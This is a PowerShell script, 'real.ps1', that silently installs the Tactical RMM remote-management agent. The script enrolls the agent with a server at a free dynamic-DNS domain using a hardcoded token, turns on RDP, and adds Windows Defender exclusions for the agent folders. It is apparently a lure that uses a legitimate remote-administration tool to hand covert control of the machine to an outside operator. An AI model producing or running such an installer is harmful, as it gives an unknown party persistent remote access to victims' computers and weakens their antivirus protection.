# real.ps1
# Tactical RMM agent installer (fileless bootstrapper)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$innosetup = 'tacticalagent-v2.10.0-windows-amd64.exe'
$api       = 'https://api.assistanthelp.dpdns.org'
$clientid  = '1'
$siteid    = '1'
$agenttype = 'server'
$power     = 0
$rdp       = 1
$ping      = 1
$auth      = 'f7a2c17e69b3ef7c17000b43aa404a577ed8a0c43d043b2ac9fb3213ff99751b'
$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.10.0/tacticalagent-v2.10.0-windows-amd64.exe'
$apilink = $downloadlink.split('/')

$serviceName = 'tacticalrmm'
if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    Write-Host ('Tactical RMM Is Already Installed')
} else {
    $OutPath = $env:TEMP
    $output = $innosetup

    $installArgs = @('-m install --api', $api, '--client-id', $clientid, '--site-id', $siteid, '--agent-type', $agenttype, '--auth', $auth)

    if ($power) { $installArgs += '--power' }
    if ($rdp)   { $installArgs += '--rdp'   }
    if ($ping)  { $installArgs += '--ping'  }

    # Add Defender exclusions if available
    try {
        $DefenderStatus = Get-MpComputerStatus | Select-Object -ExpandProperty AntivirusEnabled
        if ($DefenderStatus -eq $true) {
            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*' 2>$null
            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*'    2>$null
            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'     2>$null
        }
    } catch {}

    # Wait for network (try 3 x 5s)
    $X = 0
    do {
        Write-Output 'Waiting for network'
        Start-Sleep -Seconds 5
        $X += 1
    } until ((Test-NetConnection $apilink[2] -Port 443 -Quiet) -or $X -eq 3)

    if (Test-NetConnection $apilink[2] -Port 443 -Quiet) {
        try {
            Invoke-WebRequest -Uri $downloadlink -OutFile "$OutPath\$output"
            Start-Process -FilePath "$OutPath\$output" -ArgumentList '/VERYSILENT /SUPPRESSMSGBOXES' -Wait
            Write-Host ('Extracting...')

            Start-Sleep -Seconds 5

            Start-Process -FilePath 'C:\Program Files\TacticalAgent\tacticalrmm.exe' -ArgumentList $installArgs -Wait

            exit 0
        } catch {
            $ErrorMessage = $_.Exception.Message
            $FailedItem   = $_.Exception.ItemName
            Write-Error -Message "$ErrorMessage $FailedItem"
            exit 1
        } finally {
            Remove-Item -Path "$OutPath\$output" -Force -ErrorAction SilentlyContinue
        }
    } else {
        Write-Output 'Unable to connect to server'
    }
}
